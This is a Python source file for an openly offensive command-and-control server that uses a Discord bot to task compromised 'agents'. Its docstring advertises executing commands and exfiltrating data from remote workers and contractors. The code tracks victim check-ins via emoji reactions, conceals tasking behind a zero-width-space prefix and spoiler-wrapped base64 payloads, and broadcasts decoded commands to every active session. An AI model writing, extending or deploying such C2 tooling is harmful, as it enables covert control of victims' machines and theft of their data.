# c2_frameworks/discord/server.py
"""
Discord C2 Operator Console – Zero Implants, Zero Code on Victim
You are the bot. You are the webhook. You are the chaos.
Just type in Discord → agents react, execute, exfil.
No agent binary needed if you already have Discord running on target.
Perfect for living-off-the-land against remote workers and contractors.
"""

import discord
import asyncio
import base64
from discord.ext import commands

from .utils import (
    discord_safe_b64,
    BEACON_EMOJI,
    ACK_EMOJI,
    DONE_EMOJI
)

# Bot setup – command prefix is invisible (zero-width space)
prefix = "\u200B"
intents = discord.Intents.default()
intents.message_content = True
intents.reactions = True
bot = commands.Bot(command_prefix=prefix, intents=intents, help_command=None)

class DiscordC2Server:
    def __init__(self):
        self.active_sessions = {}  # message_id → session metadata
        print(f"[+] Discord C2 Operator Console Ready")
        print(f"[+] Use zero-width space as prefix (copy: \u200B)")
        print(f"[+] Or just type ||cmd:whoami|| in any message\n")

    @bot.event
    async def on_ready():
        print(f"[+] Operator bot online as {bot.user}")
        print(f"[+] Invite link: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&scope=bot&permissions=277696614464")
        print("\nWaiting for agents... (they will react with 🔴 when online)\n")

    @bot.event
    async def on_reaction_add(reaction, user):
        if user.bot:
            return
        if str(reaction.emoji) != BEACON_EMOJI:
            return

        message = reaction.message
        channel = message.channel

        # New agent checking in
        if message.id not in server.active_sessions:
            print(f"\n[+] NEW AGENT ONLINE")
            print(f"    User     : {user}")
            print(f"    Channel  : #{channel.name}")
            print(f"    Message  : {message.jump_url}\n")

            server.active_sessions[message.id] = {
                "user": user,
                "channel": channel,
                "message": message,
                "last_seen": discord.utils.utcnow()
            }

            await message.reply(f"Agent `{user}` checked in. Use ||cmd:payload|| to task.", delete_after=10)

    @bot.command(name="sessions")
    async def list_sessions(ctx):
        if not server.active_sessions:
            await ctx.send("No active agents.")
            return

        lines = ["🟢 **Active Agents**:"]
        for mid, data in server.active_sessions.items():
            user = data["user"]
            channel = data["channel"]
            lines.append(f"• `{user}` in `#{channel.name}`")
        
        await ctx.send("\n".join(lines))

    @bot.event
    async def on_message(message):
        if message.author == bot.user:
            return

        content = message.content

        # Detect ||cmd:base64|| payload
        if "||cmd:" in content and content.endswith("||"):
            try:
                b64_part = content.split("||cmd:")[1].split("||")[0]
                command = base64.b64decode(b64_part.replace("-", "+").replace("_", "/") + "==").decode()
                
                print(f"[+] Tasking all agents → {command}")

                # Broadcast to every known agent by replying to their beacon message
                for sess in server.active_sessions.values():
                    await sess["message"].reply(f"||cmd:{b64_part}||")
                    await sess["message"].add_reaction(ACK_EMOJI)

                await message.add_reaction("✅")
            except:
                await message.add_reaction("❌")

        await bot.process_commands(message)

# Global instance
server = DiscordC2Server()

# ——— Entry Point ———
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Discord C2 Operator Bot")
    parser.add_argument("--token", required=True, help="Your Discord bot token")
    args = parser.parse_args()

    bot.run(args.token)